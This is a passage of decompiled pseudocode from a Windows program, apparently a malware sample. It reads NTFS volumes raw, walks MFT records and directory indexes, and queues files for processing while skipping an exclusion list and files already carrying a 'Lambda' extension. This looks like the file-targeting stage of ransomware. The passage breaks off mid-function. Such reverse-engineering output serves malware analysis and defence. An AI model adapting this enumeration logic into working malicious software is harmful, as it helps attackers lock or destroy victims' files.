// 410471: using guessed type int __cdecl unknown_libname_1(_DWORD);
// 42BA40: using guessed type void *CAttr_Data<CAttrResident>::`vftable';
// 42BA5C: using guessed type void *CAttr_FileName::`vftable';
// 42BA78: using guessed type void *CAttr_IndexRoot::`vftable';
// 42BAA8: using guessed type void *CAttr_IndexAlloc::`vftable';
// 42BABC: using guessed type void *CIndexEntry::`vftable';
// 42BACC: using guessed type void *CAttr_StdInfo::`vftable';
// 42BAF0: using guessed type void *CAttrBase::`vftable';
// 42BB0C: using guessed type void *CAttr_IndexRoot::`vftable';
// 42BB28: using guessed type void *CAttr_Bitmap<CAttrResident>::`vftable';
// 42BB3C: using guessed type void *CAttr_FileName::`vftable';
// 42BB50: using guessed type void *CAttr_Bitmap<CAttrNonResident>::`vftable';
// 42BB64: using guessed type void *CAttr_VolInfo::`vftable';
// 42BB78: using guessed type void *CAttrResident::`vftable';
// 42BB8C: using guessed type void *CAttr_Data<CAttrNonResident>::`vftable';
// 42BBB0: using guessed type void *CAttr_VolName::`vftable';

//----- (0040D920) --------------------------------------------------------
int __thiscall sub_40D920(_DWORD *this, unsigned __int64 a2)
{
  int v3; // edi
  _DWORD *v4; // esi
  void *v5; // eax
  _DWORD *v6; // edi
  int v7; // esi
  unsigned __int16 *v8; // esi
  int v9; // edx
  __int16 *v10; // eax
  __int16 v11; // cx
  unsigned int v12; // eax
  int v13; // edx
  int v14; // ecx
  unsigned __int16 *v15; // eax
  int v16; // ecx
  __int16 v17; // ax
  int result; // eax
  int v19; // ecx
  void *v20; // eax
  int v21; // edx
  unsigned __int64 v22; // [esp+10h] [ebp-20h] BYREF
  unsigned __int64 v23; // [esp+18h] [ebp-18h] BYREF
  int v24; // [esp+20h] [ebp-10h]
  int v25; // [esp+24h] [ebp-Ch]
  void *v26; // [esp+28h] [ebp-8h]
  DWORD NumberOfBytesRead; // [esp+2Ch] [ebp-4h] BYREF
  __int16 v28; // [esp+3Ch] [ebp+Ch]

  v3 = 16;
  v4 = this + 23;
  do
  {
    sub_40E970(v4);
    v4 += 5;
    --v3;
  }
  while ( v3 );
  v5 = (void *)this[3];
  if ( v5 )
  {
    sub_410463(v5);
    this[3] = 0;
  }
  if ( a2 < 0x10 )
  {
    v6 = this + 2;
LABEL_7:
    v7 = *v6;
    v23 = *(_QWORD *)(*v6 + 24) + *(unsigned int *)(*v6 + 16) * a2;
    LODWORD(v23) = SetFilePointer(*(HANDLE *)(v7 + 32), v23, (PLONG)&v23 + 1, 0);
    if ( (_DWORD)v23 == -1 && GetLastError() )
      goto LABEL_24;
    v8 = (unsigned __int16 *)unknown_libname_1(*(_DWORD *)(*v6 + 16));
    if ( !ReadFile(*(HANDLE *)(*v6 + 32), v8, *(_DWORD *)(*v6 + 16), &NumberOfBytesRead, 0)
      || (v9 = *v6, NumberOfBytesRead != *(_DWORD *)(*v6 + 16)) )
    {
      j_j__free(v8);
      goto LABEL_24;
    }
    goto LABEL_11;
  }
  v19 = this[2];
  v6 = this + 2;
  if ( !*(_DWORD *)(v19 + 112) )
    goto LABEL_7;
  v22 = a2 * *(unsigned int *)(v19 + 16);
  v20 = (void *)unknown_libname_1(*(_DWORD *)(*v6 + 16));
  v21 = *v6;
  v26 = v20;
  if ( !(*(int (__thiscall **)(_DWORD, unsigned __int64 *, void *, _DWORD, DWORD *))(**(_DWORD **)(v21 + 112) + 12))(
          *(_DWORD *)(v21 + 112),
          &v22,
          v20,
          *(_DWORD *)(v21 + 16),
          &NumberOfBytesRead)
    || (v9 = *v6, NumberOfBytesRead != *(_DWORD *)(*v6 + 16)) )
  {
    j_j__free(v26);
    goto LABEL_24;
  }
  v8 = (unsigned __int16 *)v26;
LABEL_11:
  if ( !v8 )
  {
LABEL_24:
    this[4] = -1;
    result = 0;
    this[5] = -1;
    return result;
  }
  *((_QWORD *)this + 2) = a2;
  if ( *(_DWORD *)v8 == 1162627398 )
  {
    v10 = (__int16 *)((char *)v8 + v8[2]);
    v11 = *v10;
    v26 = v10 + 1;
    v28 = v11;
    v12 = *(_DWORD *)(v9 + 16) / (unsigned int)*(unsigned __int16 *)(v9 + 8);
    v13 = 0;
    v14 = v12;
    v15 = v8;
    v25 = v14;
    if ( v14 <= 0 )
    {
LABEL_16:
      this[3] = v8;
      return 1;
    }
    while ( 1 )
    {
      v16 = (int)&v15[*(unsigned __int16 *)(*v6 + 8) >> 1];
      v24 = v16;
      if ( *(_WORD *)(v16 - 2) != v28 )
        break;
      v17 = *((_WORD *)v26 + v13++);
      *(_WORD *)(v16 - 2) = v17;
      v15 = (unsigned __int16 *)v16;
      if ( v13 >= v25 )
        goto LABEL_16;
    }
  }
  sub_410463(v8);
  return 0;
}
// 410471: using guessed type int __cdecl unknown_libname_1(_DWORD);

//----- (0040DB20) --------------------------------------------------------
int __thiscall sub_40DB20(int *this)
{
  int v2; // ebx
  _DWORD *v3; // esi
  int v4; // eax
  int v5; // ebx
  unsigned int v6; // ecx
  unsigned int *v7; // esi
  int v8; // edx
  unsigned int v9; // ebx
  void (__cdecl *v10)(unsigned int *, int *); // eax
  int *v11; // ebx
  _DWORD *v12; // eax
  _DWORD *v13; // ecx
  int v14; // ecx
  int v15; // eax
  int v16; // eax
  int v18; // [esp+Ch] [ebp-Ch] BYREF
  int v19; // [esp+10h] [ebp-8h]
  _DWORD *v20; // [esp+14h] [ebp-4h] BYREF

  v2 = 16;
  v3 = this + 23;
  do
  {
    sub_40E970(v3);
    v3 += 5;
    --v2;
  }
  while ( v2 );
  v4 = this[3];
  v5 = *(unsigned __int16 *)(v4 + 20);
  v6 = *(_DWORD *)(v5 + v4);
  v7 = (unsigned int *)(v5 + v4);
  v19 = v5;
  if ( v6 != -1 )
  {
    do
    {
      v8 = this[2];
      if ( v5 + v7[1] > *(_DWORD *)(v8 + 16) )
        break;
      v9 = (v6 >> 4) - 1;
      if ( ((1 << ((v6 >> 4) - 1)) & this[22]) != 0 )
      {
        if ( v9 >= 0x10 )
          return 0;
        v10 = (void (__cdecl *)(unsigned int *, int *))this[v9 + 6];
        v18 = 0;
        if ( !v10 && (v10 = *(void (__cdecl **)(unsigned int *, int *))(v8 + 4 * v9 + 40)) == 0 || (v10(v7, &v18), !v18) )
        {
          v20 = 0;
          v20 = sub_40D140(this, (unsigned int)v7, &v20);
          if ( !v20 )
            return 0;
          v11 = &this[5 * v9];
          v12 = operator new(8u);
          v12[1] = v20;
          *v12 = 0;
          v13 = (_DWORD *)v11[26];
          if ( v13 )
            *v13 = v12;
          else
            v11[25] = (int)v12;
          ++v11[24];
          v11[26] = (int)v12;
        }
        v14 = this[25];
        this[27] = v14;
        if ( v14 )
        {
          v15 = *(_DWORD *)(v14 + 4);
          if ( v15 )
          {
            if ( (*(_DWORD *)(*(_DWORD *)(v15 + 40) + 32) & 0x4000) != 0 )
              return 0;
          }
          v16 = *(_DWORD *)(v14 + 4);
          if ( v16 )
          {
            if ( (*(_DWORD *)(*(_DWORD *)(v16 + 40) + 32) & 0x800) != 0 )
              return 0;
          }
        }
      }
      v5 = v7[1] + v19;
      v7 = (unsigned int *)((char *)v7 + v7[1]);
      v19 = v5;
      v6 = *v7;
    }
    while ( *v7 != -1 );
  }
  return 1;
}
// 40DC2D: conditional instruction was optimized away because ecx.4!=0

//----- (0040DC70) --------------------------------------------------------
char *__thiscall sub_40DC70(char *this, DWORD NumberOfBytesRead)
{
  unsigned __int16 v3; // di
  HANDLE FileW; // eax
  unsigned __int16 v5; // ax
  int v6; // edi
  int v7; // ecx
  int v8; // edi
  int v9; // edx
  int v10; // eax
  int v11; // ecx
  _DWORD *v12; // ecx
  char *v13; // edi
  int v14; // ebx
  int v15; // ebx
  char *v16; // edi
  int v18; // eax
  unsigned __int16 v19; // cx
  char *v20; // edi
  int v21; // ebx
  int v22; // ebx
  char *v23; // edi
  char *v24; // eax
  char *v25; // eax
  int v26; // eax
  int v27; // ecx
  int v28; // eax
  void (__thiscall ***v29)(_DWORD, int); // ecx
  char *v30; // edi
  int v31; // ebx
  int v32; // ebx
  char *v33; // edi
  char *v34; // edi
  int v35; // ebx
  int v36; // ebx
  char *v37; // edi
  wint_t v38; // [esp-10h] [ebp-3C8h]
  char Buffer[3]; // [esp+4h] [ebp-3B4h] BYREF
  char Str1[8]; // [esp+7h] [ebp-3B1h] BYREF
  unsigned __int16 v41; // [esp+Fh] [ebp-3A9h]
  unsigned __int8 v42; // [esp+11h] [ebp-3A7h]
  __int64 v43; // [esp+34h] [ebp-384h]
  char v44; // [esp+44h] [ebp-374h]
  char v45; // [esp+48h] [ebp-370h]
  int v46[3]; // [esp+204h] [ebp-1B4h] BYREF
  void *Block; // [esp+210h] [ebp-1A8h]
  int v48; // [esp+25Ch] [ebp-15Ch]
  char v49[128]; // [esp+260h] [ebp-158h] BYREF
  int v50; // [esp+2E0h] [ebp-D8h]
  int v51; // [esp+2E8h] [ebp-D0h]
  char v52; // [esp+3A0h] [ebp-18h] BYREF
  WCHAR FileName[10]; // [esp+3A4h] [ebp-14h] BYREF

  v3 = NumberOfBytesRead;
  v38 = NumberOfBytesRead;
  *(_DWORD *)this = &CNTFSVolume::`vftable';
  *((_DWORD *)this + 8) = -1;
  *((_DWORD *)this + 9) = 0;
  *((_DWORD *)this + 27) = 0;
  *((_DWORD *)this + 28) = 0;
  *((_WORD *)this + 52) = 0;
  *(_OWORD *)(this + 40) = 0i64;
  *(_OWORD *)(this + 56) = 0i64;
  *(_OWORD *)(this + 72) = 0i64;
  *(_OWORD *)(this + 88) = 0i64;
  if ( !iswalpha(v38) )
    return this;
  sub_40C360((int *)FileName, 6, (int)L"\\\\.\\%c:", v3);
  FileName[6] = 0;
  FileW = CreateFileW(FileName, 0x80000000, 3u, 0, 3u, 1u, 0);
  *((_DWORD *)this + 8) = FileW;
  if ( FileW == (HANDLE)-1
    || !ReadFile(FileW, Buffer, 0x200u, &NumberOfBytesRead, 0)
    || NumberOfBytesRead != 512
    || strncmp(Str1, "NTFS    ", 8u) )
  {
    if ( *((_DWORD *)this + 8) != -1 )
    {
      CloseHandle(*((HANDLE *)this + 8));
      *((_DWORD *)this + 8) = -1;
    }
    return this;
  }
  v5 = v41;
  v6 = v42;
  v7 = v44;
  *((_WORD *)this + 4) = v41;
  v8 = v5 * v6;
  *((_DWORD *)this + 3) = v8;
  if ( v7 <= 0 )
    v9 = 1 << -(char)v7;
  else
    v9 = v7 * v8;
  *((_DWORD *)this + 4) = v9;
  if ( v45 <= 0 )
    v10 = 1 << -v45;
  else
    v10 = v45 * v8;
  *((_DWORD *)this + 5) = v10;
  v11 = (v43 * (unsigned __int64)(unsigned int)v8) >> 32;
  *((_DWORD *)this + 6) = v8 * v43;
  *((_DWORD *)this + 7) = v11;
  sub_40D030((char *)v46, (int)this);
  v48 = 99;
  if ( !sub_40D920(v12, 3ui64) )
  {
    v46[0] = (int)&CFileRecord::`vftable';
    v13 = v49;
    v14 = 16;
    do
    {
      sub_40E970(v13);
      v13 += 20;
      --v14;
    }
    while ( v14 );
    if ( Block )
      sub_410463(Block);
    v15 = 16;
    v16 = &v52;
    do
    {
      v16 -= 20;
      *(_DWORD *)v16 = &CSList<CAttrBase>::`vftable';
      sub_40E970(v16);
      --v15;
    }
    while ( v15 );
    return this;
  }
  sub_40DB20(v46);
  v51 = v50;
  if ( v50 )
  {
    v18 = *(_DWORD *)(v50 + 4);
    if ( v18 )
    {
      v19 = _byteswap_ushort(*(_WORD *)(*(_DWORD *)(v18 + 40) + 8));
      *((_WORD *)this + 52) = v19;
      if ( v19 < 0x300u )
      {
        v46[0] = (int)&CFileRecord::`vftable';
        v20 = v49;
        v21 = 16;
        do
        {
          sub_40E970(v20);
          v20 += 20;
          --v21;
        }
        while ( v21 );
        if ( Block )
          sub_410463(Block);
        v22 = 16;
        v23 = &v52;
        do
        {
          v23 -= 20;
          *(_DWORD *)v23 = &CSList<CAttrBase>::`vftable';
          sub_40E970(v23);
          --v22;
        }
        while ( v22 );
        return this;
      }
      *((_DWORD *)this + 9) = 1;
      v24 = (char *)operator new(0x1A0u);
      v25 = sub_40D030(v24, (int)this);
      *((_DWORD *)this + 27) = v25;
      *((_DWORD *)v25 + 22) = 131;
      if ( !sub_40D920(*((_DWORD **)this + 27), 0i64) )
        goto LABEL_38;
      sub_40DB20(*((int **)this + 27));
      v26 = *((_DWORD *)this + 27);
      v27 = *(_DWORD *)(v26 + 240);
      *(_DWORD *)(v26 + 248) = v27;
      if ( v27 )
      {
        v28 = *(_DWORD *)(v27 + 4);
        *((_DWORD *)this + 28) = v28;
        if ( v28 )
        {
LABEL_38:
          v46[0] = (int)&CFileRecord::`vftable';
          v30 = v49;
          v31 = 16;
          do
          {
            sub_40E970(v30);
            v30 += 20;
            --v31;
          }
          while ( v31 );
          if ( Block )
            sub_410463(Block);
          v32 = 16;
          v33 = &v52;
          do
          {
            v33 -= 20;
            *(_DWORD *)v33 = &CSList<CAttrBase>::`vftable';
            sub_40E970(v33);
            --v32;
          }
          while ( v32 );
          return this;
        }
      }
      else
      {
        *((_DWORD *)this + 28) = 0;
      }
      v29 = (void (__thiscall ***)(_DWORD, int))*((_DWORD *)this + 27);
      if ( v29 )
        (**v29)(v29, 1);
      *((_DWORD *)this + 27) = 0;
      goto LABEL_38;
    }
  }
  v46[0] = (int)&CFileRecord::`vftable';
  v34 = v49;
  v35 = 16;
  do
  {
    sub_40E970(v34);
    v34 += 20;
    --v35;
  }
  while ( v35 );
  if ( Block )
    sub_410463(Block);
  v36 = 16;
  v37 = &v52;
  do
  {
    v37 -= 20;
    *(_DWORD *)v37 = &CSList<CAttrBase>::`vftable';
    sub_40E970(v37);
    --v36;
  }
  while ( v36 );
  return this;
}
// 40DDE1: variable 'v12' is possibly undefined
// 42B8CC: using guessed type wchar_t aC_0[8];
// 42BAC4: using guessed type void *CNTFSVolume::`vftable';
// 42BB04: using guessed type void *CSList<CAttrBase>::`vftable';
// 42BBA0: using guessed type void *CFileRecord::`vftable';
// 40DC70: using guessed type char Buffer[3];
// 40DC70: using guessed type char Str1[8];

//----- (0040E070) --------------------------------------------------------
_DWORD *__thiscall sub_40E070(_DWORD *Block, char a2)
{
  void *v3; // eax
  void (__thiscall ***v4)(_DWORD, int); // ecx

  v3 = (void *)Block[8];
  *Block = &CNTFSVolume::`vftable';
  if ( v3 != (void *)-1 )
    CloseHandle(v3);
  v4 = (void (__thiscall ***)(_DWORD, int))Block[27];
  if ( v4 )
    (**v4)(v4, 1);
  if ( (a2 & 1) != 0 )
    sub_410463(Block);
  return Block;
}
// 42BAC4: using guessed type void *CNTFSVolume::`vftable';

//----- (0040E0B0) --------------------------------------------------------
int __fastcall sub_40E0B0(int a1, int a2)
{
  int result; // eax
  int v3; // esi
  int v4; // ecx
  wchar_t *v5; // ebx
  int v6; // eax
  unsigned __int8 v7; // cl
  int v8; // esi
  LPWSTR ExtensionW; // eax
  const WCHAR *v10; // esi
  char *v11; // esi
  _WORD *v12; // ecx
  unsigned __int16 *v14; // ecx
  WCHAR *v15; // eax
  int v16; // edx
  __int16 v17; // ax
  char *v18; // [esp+10h] [ebp-10h]
  unsigned int dwBytesa; // [esp+14h] [ebp-Ch]
  wchar_t *i; // [esp+18h] [ebp-8h]
  LPWSTR lpMema; // [esp+1Ch] [ebp-4h]
  WCHAR *lpMemb; // [esp+1Ch] [ebp-4h]

  result = a1;
  v3 = *(_DWORD *)(a1 + 4);
  if ( v3 && (*(_BYTE *)(v3 + 56) & 4) != 0 )
    return result;
  v4 = *(_DWORD *)(a1 + 24);
  if ( v4 )
  {
    result = *(unsigned __int16 *)(v4 + 4);
    if ( !*(_WORD *)(v4 + 4) && *(_DWORD *)v4 < 0x10u )
      return result;
    result = a1;
  }
  if ( !v3 )
    return result;
  if ( *(int *)(result + 12) <= 0 )
    return result;
  if ( *(_BYTE *)(v3 + 65) == 2 )
    return result;
  result = *(_DWORD *)(v3 + 52) | *(_DWORD *)(v3 + 48);
  if ( !*(_QWORD *)(v3 + 48) || *(_DWORD *)(a2 + 8) && *(_QWORD *)(v3 + 48) <= 0xA00000ui64 )
    return result;
  v5 = (wchar_t *)HeapAlloc(hHeap, 8u, 0x208u);
  for ( i = v5; !v5; i = v5 )
  {
    Sleep(0x64u);
    v5 = (wchar_t *)HeapAlloc(hHeap, 8u, 0x208u);
  }
  v6 = *(_DWORD *)(a1 + 4);
  if ( v6 )
  {
    v7 = *(_BYTE *)(v6 + 64);
    if ( v7 )
    {
      v8 = v7;
      wcsncpy(v5, (const wchar_t *)(v6 + 66), v7);
      v5[v8] = 0;
    }
  }
  if ( sub_40A560(v5) )
    return HeapFree(hHeap, 0, v5);
  ExtensionW = PathFindExtensionW(v5);
  lpMema = ExtensionW;
  if ( *ExtensionW )
  {
    if ( lstrcmpiW(ExtensionW + 1, L"Lambda") )
    {
      v10 = dword_430914;
      if ( *dword_430914 )
      {
        while ( lstrcmpiW(lpMema + 1, v10) )
        {
          v10 += lstrlenW(v10) + 1;
          if ( !*v10 )
            goto LABEL_24;
        }
        return HeapFree(hHeap, 0, v5);
      }
      goto LABEL_24;
    }
    return HeapFree(hHeap, 0, v5);
  }
LABEL_24:
  v11 = (char *)(a2 + 12);
  v12 = (_WORD *)(a2 + 12);
  v18 = (char *)(a2 + 12);
  while ( *v12++ )
    ;
  dwBytesa = 2 * (wcslen(v5) + (((int)v12 - a2 - 14) >> 1)) + 2;
  v14 = (unsigned __int16 *)HeapAlloc(hHeap, 8u, dwBytesa);
  lpMemb = v14;
  if ( !v14 )
  {
    do
    {
      Sleep(0x64u);
      v15 = (WCHAR *)HeapAlloc(hHeap, 8u, dwBytesa);
      lpMemb = v15;
    }
    while ( !v15 );
    v11 = v18;
    v14 = v15;
    v5 = i;
  }
  v16 = (char *)v14 - v11;
  do
  {
    v17 = *(_WORD *)v11;
    v11 += 2;
    *(_WORD *)&v11[v16 - 2] = v17;
  }
  while ( v17 );
  wcscat(v14, v5);
  sub_40FB80(lpMemb);
  if ( !sub_40A8B0(lpMemb, v5) )
    _InterlockedIncrement(&dword_430A1C);
  HeapFree(hHeap, 0, v5);
  return HeapFree(hHeap, 0, lpMemb);
}
// 430A1C: using guessed type int dword_430A1C;

//----- (0040E330) --------------------------------------------------------
void *__fastcall sub_40E330(_DWORD *a1, int *a2)
{
  int v2; // eax
  unsigned int v4; // edx
  void *result; // eax
  wchar_t *v6; // ebx
  int v7; // eax
  unsigned __int8 v8; // cl
  int v9; // esi
  const WCHAR *j; // esi
  char *v11; // edx
  __int16 v12; // ax
  unsigned int v13; // edx
  _WORD *v14; // edi
  __int16 v15; // ax
  wchar_t *v16; // edi
  wchar_t v17; // ax
  int v18; // eax
  int v19; // esi
  char *v20; // eax
  int *v21; // edi
  const wchar_t *v22; // edi
  wchar_t *v23; // esi
  wchar_t *v24; // edx
  int v25; // esi
  int v26; // edi
  int v27; // eax
  int v28; // eax
  int v29; // eax
  int v30; // esi
  int v31; // eax
  int v32; // esi
  _DWORD *v33; // esi
  int v34; // ecx
  int v35; // eax
  int v36; // esi
  int v38; // [esp+Ch] [ebp-14h]
  int v39; // [esp+Ch] [ebp-14h]
  wchar_t *Str; // [esp+10h] [ebp-10h]
  int v41; // [esp+14h] [ebp-Ch]
  wchar_t *i; // [esp+1Ch] [ebp-4h]

  v2 = a1[6];
  if ( !v2 || (v4 = *(_DWORD *)v2, (result = (void *)*(unsigned __int16 *)(v2 + 4)) != 0) || v4 >= 0x10 )
  {
    result = (void *)a1[1];
    if ( result )
    {
      if ( (int)a1[3] > 0 && *((_BYTE *)result + 65) != 2 && (!dword_430938 || (*((_BYTE *)result + 56) & 2) == 0) )
      {
        v6 = (wchar_t *)HeapAlloc(hHeap, 8u, 0x208u);
        for ( i = v6; !v6; i = v6 )
        {
          Sleep(0x64u);
          v6 = (wchar_t *)HeapAlloc(hHeap, 8u, 0x208u);
        }
        v7 = a1[1];
        if ( v7 )
        {
          v8 = *(_BYTE *)(v7 + 64);
          if ( v8 )
          {
            v9 = v8;
            wcsncpy(v6, (const wchar_t *)(v7 + 66), v8);
            v6[v9] = 0;
          }
        }
        for ( j = lpMem; *j; j += lstrlenW(j) + 1 )
        {
          result = (void *)lstrcmpiW(v6, j);
          if ( !result )
            goto LABEL_36;
        }
        v11 = (char *)v6;
        Str = (wchar_t *)(a2 + 3);
        do
        {
          v12 = *(_WORD *)v11;
          v11 += 2;
        }
        while ( v12 );
        v13 = v11 - (char *)v6;
        v14 = (_WORD *)a2 + 5;
        do
        {
          v15 = v14[1];
          ++v14;
        }
        while ( v15 );
        qmemcpy(v14, v6, v13);
        v16 = Str - 1;
        do
        {
          v17 = v16[1];
          ++v16;
        }
        while ( v17 );
        *(_DWORD *)v16 = *(_DWORD *)L"\\";
        sub_40A5E0(Str);
        v18 = a1[6];
        if ( v18 )
        {
          v41 = *(_DWORD *)v18;
          v38 = *(unsigned __int16 *)(v18 + 4);
        }
        else
        {
          v41 = -1;
          v38 = -1;
        }
        v19 = *a2;
        v20 = (char *)operator new(0x1A0u);
        v21 = (int *)sub_40D030(v20, v19);
        if ( sub_40D920(v21, __PAIR64__(v38, v41)) )
        {
          v27 = sub_40DB20(v21);
          if ( !v21 )
            goto LABEL_29;
          if ( v27 )
          {
            v28 = v21[65];
            v21[67] = v28;
            if ( v28 && (v29 = *(_DWORD *)(v28 + 4)) != 0 )
            {
              v30 = v29 + 48;
              v31 = v29 + 56;
            }
            else
            {
              v30 = 8;
              v31 = 16;
            }
            v32 = *(_DWORD *)v30;
            v39 = v31;
            *(_DWORD *)v31 = v32;
            if ( v32 )
            {
              v33 = *(_DWORD **)(v32 + 4);
              if ( v33 )
              {
                do
                {
                  v34 = v33[6];
                  if ( v34 && (*(_BYTE *)(v34 + 12) & 1) != 0 )
                  {
                    sub_40E6C0((int)v21, (int)a2, *(_QWORD *)(*(unsigned __int16 *)(v34 + 8) + v34 - 8));
                    v31 = v39;
                  }
                  if ( (int)v33[3] > 0 )
                  {
                    v35 = v33[1];
                    if ( v35 && (*(_DWORD *)(v35 + 56) & 0x10000000) != 0 )
                      sub_40E330(v33, a2);
                    else
                      sub_40E0B0((int)v33, (int)a2);
                    v31 = v39;
                  }
                  if ( !*(_DWORD *)v31 )
                    break;
                  v36 = **(_DWORD **)v31;
                  *(_DWORD *)v31 = v36;
                  if ( !v36 )
                    break;
                  v33 = *(_DWORD **)(v36 + 4);
                }
                while ( v33 );
                v6 = i;
              }
            }
            (*(void (__thiscall **)(int *, int))*v21)(v21, 1);
            v22 = Str;
            goto LABEL_30;
          }
        }
        else if ( !v21 )
        {
LABEL_29:
          v22 = Str;
          sub_408990((int)L"Can't Recursive Search For: %s", (int)Str);
LABEL_30:
          v23 = wcsstr(v22, v6);
          if ( wcsstr(&v23[wcslen(v6)], v6) )
          {
            v24 = (wchar_t *)v22;
            v25 = 0;
            do
            {
              v26 = v25++;
              v24 = wcsstr(&v24[wcslen(v6)], v6);
            }
            while ( v24 );
            v23 = Str;
            if ( v26 > 0 )
            {
              do
              {
                v23 = wcsstr(&v23[wcslen(v6)], v6);
                --v26;
              }
              while ( v26 );
            }
          }
          result = memset(v23, 0, wcslen(v23));
LABEL_36:
          if ( v6 )
            return (void *)HeapFree(hHeap, 0, v6);
          return result;
        }
        (*(void (__thiscall **)(int *, int))*v21)(v21, 1);
        goto LABEL_29;
      }
    }
  }
  return result;
}
// 42B8E8: using guessed type wchar_t aCanTRecursiveS[31];
// 430938: using guessed type int dword_430938;

//----- (0040E6C0) --------------------------------------------------------
_DWORD *__usercall sub_40E6C0@<eax>(int a1@<edx>, int a2@<ecx>, __int64 a3)
{
  _DWORD *result; // eax
  int v5; // ecx
  int *v6; // edi
  _DWORD *v7; // esi
  int v8; // ecx
  int v9; // eax
  int v10; // eax
  int v11[2]; // [esp+10h] [ebp-20h] BYREF
  int *v12; // [esp+18h] [ebp-18h]
  int v13; // [esp+1Ch] [ebp-14h]
  int *v14; // [esp+20h] [ebp-10h]
  void *Block; // [esp+24h] [ebp-Ch]
  int v16; // [esp+2Ch] [ebp-4h]

  result = *(_DWORD **)(a1 + 280);
  v16 = a1;
  *(_DWORD *)(a1 + 288) = result;
  if ( result )
  {
    v5 = result[1];
    if ( v5 )
    {
      v13 = 0;
      v12 = 0;
      v14 = 0;
      v11[1] = 0;
      v11[0] = (int)&CIndexBlock::`vftable';
      Block = 0;
      if ( sub_40CE50(v5, &a3, v11) )
      {
        v6 = v12;
        v14 = v12;
        if ( v12 )
        {
          v7 = (_DWORD *)v12[1];
          if ( v7 )
          {
            do
            {
              v8 = v7[6];
              if ( v8 && (*(_BYTE *)(v8 + 12) & 1) != 0 )
                sub_40E6C0(*(_DWORD *)(*(unsigned __int16 *)(v8 + 8) + v8 - 8));
              if ( (int)v7[3] > 0 )
              {
                v9 = v7[1];
                if ( v9 && (*(_DWORD *)(v9 + 56) & 0x10000000) != 0 )
                  sub_40E330(v7, a2);
                else
                  sub_40E0B0((int)v7, a2);
              }
              v10 = *v6;
              v6 = (int *)v10;
              if ( !v10 )
                break;
              v7 = *(_DWORD **)(v10 + 4);
            }
            while ( v7 );
            v14 = (int *)v10;
          }
        }
      }
      if ( Block )
        sub_410463(Block);
      v11[0] = (int)&CSList<CIndexEntry>::`vftable';
      return sub_40E970(v11);
    }
  }
  return result;
}
// 40E330: using guessed type int __fastcall sub_40E330(_DWORD, _DWORD);
// 42BAE8: using guessed type void *CSList<CIndexEntry>::`vftable';
// 42BB20: using guessed type void *CIndexBlock::`vftable';

//----- (0040E7D0) --------------------------------------------------------
BOOL __cdecl sub_40E7D0(char *lpMem)
{
  int v1; // edx
  int v2; // ebx
  int v3; // ebx
  int v4; // esi
  _DWORD *i; // esi
  int v6; // ecx
  int v7; // eax
  int *v8; // esi
  int v9; // esi
  void (__thiscall ***v10)(_DWORD, int); // ecx
  char *v12; // [esp-4h] [ebp-1Ch]
  int v13; // [esp+10h] [ebp-8h]

  *((_DWORD *)lpMem + 2) = dword_4308D0;
  sub_408990((int)L"Start Enumeration (NTFS Search): %s", (int)(lpMem + 12));
  sub_40A5E0((LPCWSTR)lpMem + 6);
  while ( 1 )
  {
    v1 = *((_DWORD *)lpMem + 1);
    v13 = v1;
    v2 = *(_DWORD *)(v1 + 260);
    *(_DWORD *)(v1 + 268) = v2;
    if ( !v2 )
      break;
    v3 = *(_DWORD *)(v2 + 4);
    if ( !v3 || **(_DWORD **)(v3 + 60) != 48 )
      break;
    v4 = *(_DWORD *)(v3 + 48);
    *(_DWORD *)(v3 + 56) = v4;
    if ( v4 )
    {
      for ( i = *(_DWORD **)(v4 + 4); i; v1 = v13 )
      {
        v6 = i[6];
        if ( v6 && (*(_BYTE *)(v6 + 12) & 1) != 0 )
          sub_40E6C0(v1, (int)lpMem, *(_QWORD *)(*(unsigned __int16 *)(v6 + 8) + v6 - 8));
        if ( (int)i[3] > 0 )
        {
          v7 = i[1];
          if ( v7 && (*(_DWORD *)(v7 + 56) & 0x10000000) != 0 )
            sub_40E330(i, (int *)lpMem);
          else
            sub_40E0B0((int)i, (int)lpMem);
        }
        v8 = *(int **)(v3 + 56);
        if ( !v8 )
          break;
        v9 = *v8;
        *(_DWORD *)(v3 + 56) = v9;
        if ( !v9 )
          break;
        i = *(_DWORD **)(v9 + 4);
      }
    }
    v12 = lpMem + 12;
    if ( !*((_DWORD *)lpMem + 2) )
    {
      sub_408990((int)L"Finished Exploring All Files on (NTFS Search): %s", (int)v12);
      break;
    }
    sub_408990((int)L"Finished Exploring Large Files on (NTFS Search): %s", (int)v12);
    *((_DWORD *)lpMem + 2) = 0;
  }
  v10 = (void (__thiscall ***)(_DWORD, int))*((_DWORD *)lpMem + 1);
  if ( v10 )
    (**v10)(v10, 1);
  if ( *(_DWORD *)lpMem )
    (***(void (__thiscall ****)(_DWORD, int))lpMem)(*(_DWORD *)lpMem, 1);
  return HeapFree(hHeap, 0, lpMem);
}
// 42B928: using guessed type wchar_t aStartEnumerati_0[36];
// 42B970: using guessed type wchar_t aFinishedExplor_1[52];
// 42B9D8: using guessed type wchar_t aFinishedExplor_2[50];
// 4308D0: using guessed type int dword_4308D0;

//----- (0040E910) --------------------------------------------------------
_DWORD *__thiscall sub_40E910(_DWORD *this)
{
  _DWORD *result; // eax
  void (__thiscall ***v3)(_DWORD, int); // ecx

  result = (_DWORD *)this[2];
  for ( *this = &CSList<CFileRecord>::`vftable'; result; this[2] = result )
  {
    this[4] = *result;
    v3 = (void (__thiscall ***)(_DWORD, int))result[1];
    if ( v3 )
    {
      (**v3)(v3, 1);
      result = (_DWORD *)this[2];
    }
    sub_410463(result);
    result = (_DWORD *)this[4];
  }
  this[3] = 0;
  this[2] = 0;
  this[4] = 0;
  this[1] = 0;
  return result;
}
// 42BBA8: using guessed type void *CSList<CFileRecord>::`vftable';

//----- (0040E970) --------------------------------------------------------
_DWORD *__thiscall sub_40E970(_DWORD *this)
{
  _DWORD *result; // eax
  void (__thiscall ***v3)(_DWORD, int); // ecx

  for ( result = (_DWORD *)this[2]; result; this[2] = result )
  {
    this[4] = *result;
    v3 = (void (__thiscall ***)(_DWORD, int))result[1];
    if ( v3 )
    {
      (**v3)(v3, 1);
      result = (_DWORD *)this[2];
    }
    sub_410463(result);
    result = (_DWORD *)this[4];
  }
  this[3] = 0;
  this[2] = 0;
  this[4] = 0;
  this[1] = 0;
  return result;
}

//----- (0040E9D0) --------------------------------------------------------
int __thiscall sub_40E9D0(int this)
{
  int v2; // ecx
  int result; // eax

  if ( *(_DWORD *)(this + 8) )
  {
    do
    {
      v2 = *(_DWORD *)(this + 8);
      *(_DWORD *)(this + 16) = *(_DWORD *)v2;
      sub_410463(*(void **)(v2 + 4));
      sub_410463(*(void **)(this + 8));
      result = *(_DWORD *)(this + 16);
